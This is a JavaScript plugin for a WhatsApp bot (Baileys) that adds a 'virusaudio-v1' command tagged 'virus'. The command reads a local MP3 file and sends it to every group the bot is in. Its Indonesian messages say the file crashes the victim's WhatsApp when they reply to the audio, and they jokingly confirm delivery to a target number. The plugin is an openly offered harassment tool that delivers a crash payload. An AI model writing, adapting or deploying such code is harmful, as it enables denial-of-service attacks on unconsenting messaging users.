let { generateWAMessageFromContent, prepareWAMessageMedia, proto } = (await import('@adiwajshing/baileys')).default
import moment from 'moment-timezone'
import fetch from 'node-fetch'
import fs from 'fs'
import { sticker } from '../lib/sticker.js'
let handler  = async (m, { conn, args, text, command, usedPrefix, participants }) => {
let wanz = 'https://telegra.ph/file/c080917609684bf229cd3.jpg'
if (!text)return conn.send2ButtonImg(m.chat, `https://telegra.ph/file/c080917609684bf229cd3.jpg`, `${gcname}`,`*Nomor Yang Mau DiKirim ${command} Mana Cuy?*\n\n*NOTE*:Virus Ini Aktif Ketika Korban Mau Balas Audio,Maka Wangsafnya Akan Crash.\nhehe🗿\n\n${botdate}`,
     'Owner','.owner',
       'Donasi','.donasi'
       )
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? conn.user.jid : m.sender
let tes = 'tess'
let getGroups = await conn.groupFetchAllParticipating()
    let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
    let anu = groups.map(v => v.id)
let name = conn.getName(who)
let virusaudio = fs.readFileSync('./mp3/a-virusaudio-v1.mp3')
conn.reply(m.chat, 'Sedang Mengirim...', m)
for (let i of anu) {
conn.reply(i, virusaudio,)
await conn.send2ButtonImg(m.chat, wanz, gcname, `*Sukses Mengirim ${command} Ke Nomor: ${text}@s.whatsapp.net\n\n*NOTE*:Virus Ini Aktif Ketika Korban Mau Balas Audio,Maka Wangsafnya Akan Crash.\nhehe🗿\n\n${botdate}`,
   'Menu','.menu',
     'Owner','.owner'
       )
          }}
handler.help = ['virusaudio-v1 <number>']
handler.tags = ['virus']
handler.command = /^(virusaudio-v1)$/i
handler.premium = false
handler.limit = true

export default handler